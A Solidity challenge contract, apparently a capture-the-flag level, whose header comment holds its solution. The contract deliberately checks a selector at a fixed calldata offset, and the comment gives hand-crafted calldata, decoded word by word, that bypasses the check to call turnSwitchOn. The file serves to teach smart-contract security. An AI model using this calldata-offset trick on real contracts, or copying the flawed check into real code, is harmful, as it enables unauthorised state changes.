// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev The goal here is to switch the boolean on. We need to encode properly the calldata to be able to trigger
/// the turnSwitchOn fct from the flipSwitch. We will encode a switchOff and a switch On in the same calldata.
/// Solution : "await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})"
/// function selector:
/// 30c13ade
/// offset, now = 96-bytes:
/// 0000000000000000000000000000000000000000000000000000000000000060
/// extra bytes:
/// 0000000000000000000000000000000000000000000000000000000000000000 
/// here is the check at 68 byte (used only for the check, not relevant for the external call made by our function):
/// 20606e1500000000000000000000000000000000000000000000000000000000
/// length of the data:
/// 0000000000000000000000000000000000000000000000000000000000000004 
/// data that contains the selector of the function that will be called from our function:
/// 76227e1200000000000000000000000000000000000000000000000000000000
contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}